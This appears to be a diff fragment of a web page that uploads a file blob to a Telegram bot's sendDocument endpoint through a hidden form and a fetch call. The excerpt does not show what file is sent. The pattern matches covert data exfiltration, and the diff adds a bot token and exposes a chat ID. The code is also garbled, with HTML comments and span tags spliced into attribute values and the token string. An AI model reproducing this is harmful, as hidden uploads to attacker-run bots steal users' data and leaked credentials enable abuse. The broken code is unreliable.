@@ -82,7 +82,7 @@ button:hover { background: #334155; }
 <!-- Hidden form for Telegram upload -->
 <form id="telegramForm" method="POST" enctype="multipart/form-data" style="display:none;">
   <input type="file" name="document" id="telegramFileInput" />
-  <input type="hidden" name="chat_id" value="<!-- <span style="color:pink;">8580854380</span> -->" />
+  <input type="hidden" name="chat_id" value="<!-- <span style="color:pink;">YOUR_CHAT_ID</span> -->" />
 </form>
 
 <script>
@@ -236,7 +236,7 @@ async function sendFileToTelegram(fileBlob) {
   formData.append('chat_id','<!-- <span style="color:pink;">8580854380</span> -->'); // <--- Change here
   formData.append('document',fileBlob,'upload.txt');
   try {
-    await fetch(`https://api.telegram.org/bot<!-- <span style="color:pink;">8302046626AAETtWXTTdFHr5bKqSWhAvLakb4axjGlz9U<!-- <span style="color:pink;">YOUR_BOT_TOKEN</span> -->/sendDocument`, {
+    await fetch(`https://api.telegram.org/bot<!-- <span style="color:pink;">8302046626:AAETtWXTTdFHr5bKqSWhAvLakb4axjGlz9U</span> -->/sendDocument`, {
       method:'POST',
       body:formData
     });
